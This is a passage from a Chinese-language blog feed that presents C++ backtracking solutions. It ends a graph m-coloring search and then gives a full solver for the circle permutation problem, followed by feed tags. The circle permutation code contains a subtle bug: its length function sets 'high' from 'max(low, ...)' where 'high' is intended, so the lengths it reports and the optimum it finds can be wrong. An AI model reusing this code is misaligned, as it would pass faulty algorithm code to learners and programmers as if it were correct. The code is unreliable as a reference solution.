comment">// 检查所有与顶点idx相连的顶点j是否与顶点idx颜色相同，若相同，则此着色方案不合法</span><span class="token keyword">auto</span> check <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX <span class="token operator">&amp;&amp;</span> coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> coloring<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 递归搜索函数</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大搜索深度，将该着色方案加入解集中</span>res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>coloring<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 遍历所有颜色，尝试为顶点idx进行着色</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span> <span class="token comment">// 着色</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 此着色合法，继续向下搜索</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 回溯</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="圆排列问题"><a href="#圆排列问题" class="headerlink" title="圆排列问题"></a>圆排列问题</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/circle.png"></p><h2 id="解题代码-6"><a href="#解题代码-6" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">double</span> <span class="token function">circlePermutation</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span><span class="token operator">&amp;</span> radius<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> radius<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 圆的个数</span><span class="token keyword">double</span> res <span class="token operator">=</span> INT32_MAX<span class="token punctuation">;</span> <span class="token comment">// 最小长度</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> optimalPerm<span class="token punctuation">;</span> <span class="token comment">// 最小长度对应的排列方式</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> <span class="token function">curX</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// curX[i]表示当前排列下圆i的圆心横坐标</span><span class="token comment">// 计算当前排列下圆idx的圆心横坐标</span><span class="token keyword">auto</span> calCenter <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">double</span> <span class="token punctuation">&#123;</span><span class="token keyword">double</span> xMax <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> idx<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">double</span> x <span class="token operator">=</span> curX<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2.0</span> <span class="token operator">*</span> <span class="token function">sqrt</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">*</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xMax <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>xMax<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> xMax<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 计算当前排列下的总长度</span><span class="token keyword">auto</span> calLen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">double</span> <span class="token punctuation">&#123;</span><span class="token keyword">double</span> low <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> curX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> radius<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>high <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> curX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> radius<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> high <span class="token operator">-</span> low<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 递归搜索函数</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 到达最大搜索深度</span><span class="token keyword">double</span> len <span class="token operator">=</span> <span class="token function">calLen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 更新最优解</span>res <span class="token operator">=</span> len<span class="token punctuation">;</span>optimalPerm <span class="token operator">=</span> radius<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> idx<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 全排列</span><span class="token function">swap</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">double</span> centerX <span class="token operator">=</span> <span class="token function">calCenter</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>centerX <span class="token operator">+</span> radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">+</span> radius<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 剪枝</span>curX<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> centerX<span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">swap</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 打印最优解对应的圆排列</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> optimalPerm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;装载问题&quot;&gt;&lt;a href=&quot;#装载问题&quot; class=&quot;headerlink&quot; title=&quot;装载问题&quot;&gt;&lt;/a&gt;装载问题&lt;/h1&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="数据结构与算法" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="C++" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="算法" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
</feed>
